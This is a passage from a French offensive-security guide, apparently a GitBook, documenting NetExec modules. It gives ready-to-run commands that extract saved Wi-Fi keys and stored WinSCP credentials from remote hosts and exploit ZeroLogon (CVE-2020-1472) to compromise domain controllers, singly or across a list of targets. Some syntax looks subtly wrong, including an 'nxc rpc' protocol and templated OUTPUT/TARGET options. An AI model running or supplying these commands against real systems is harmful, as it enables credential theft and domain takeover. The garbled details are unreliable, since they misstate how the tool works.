**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M whoami -o OUTPUT=all_whoami_results.txt
```

**Explication** :

* Exécute `whoami` sur plusieurs cibles et compile les résultats.

***

### Module : `wifi`

**1. Nom du Module : `wifi`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module extrait les informations de configuration Wi-Fi, y compris les SSID et clés enregistrés.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les informations Wi-Fi extraites.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M wifi
```

**Explication** :

* Récupère les informations des réseaux Wi-Fi configurés sur la cible spécifiée.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -M wifi -o OUTPUT=wifi_data.txt
```

**Explication** :

* Sauvegarde les informations Wi-Fi extraites dans `wifi_data.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M wifi -o OUTPUT=all_wifi_data.txt
```

**Explication** :

* Compile les informations Wi-Fi pour plusieurs cibles dans un fichier unique.

***

### Module : `winscp`

**1. Nom du Module : `winscp`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module recherche et extrait les informations de configuration de l'application WinSCP, y compris les identifiants enregistrés.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les configurations extraites.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M winscp
```

**Explication** :

* Recherche les configurations WinSCP sur la cible spécifiée.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -M winscp -o OUTPUT=winscp_configs.txt
```

**Explication** :

* Sauvegarde les configurations extraites dans `winscp_configs.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M winscp -o OUTPUT=all_winscp_configs.txt
```

**Explication** :

* Compile les configurations WinSCP pour plusieurs cibles dans un fichier unique.

***

### Module : `zerologon`

**1. Nom du Module : `zerologon`**

* **Protocole pris en charge** : RPC
* **Description** : Ce module exploite la vulnérabilité "ZeroLogon" (CVE-2020-1472) pour compromettre un contrôleur de domaine.

**2. Options / Paramètres**

* `--TARGET` : Nom ou adresse IP du contrôleur de domaine cible.
* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc rpc 192.168.1.10 -M zerologon -o TARGET=dc.example.com
```

**Explication** :

* Exploite la vulnérabilité ZeroLogon sur le contrôleur de domaine spécifié.

**Commande avec fichier de sortie** :

```
nxc rpc 192.168.1.10 -M zerologon -o TARGET=dc.example.com,OUTPUT=zerologon_results.txt
```

**Explication** :

* Sauvegarde les résultats dans `zerologon_results.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc rpc targets.txt -M zerologon -o OUTPUT=all_zerologon_results.txt
```

**Explication** :

* Exploite ZeroLogon sur plusieurs cibles et compile les résultats.

***

**Liens utiles :**

* [Mentions légales](https://dika-1.gitbook.io/road-to-hacker/mentions-legales)
* [Politique de confidentialité](https://dika-1.gitbook.io/road-to-hacker/politique-de-confidentialite)
* [Contactez-nous](mailto:dika-road-to-hacker@protonmail.com)
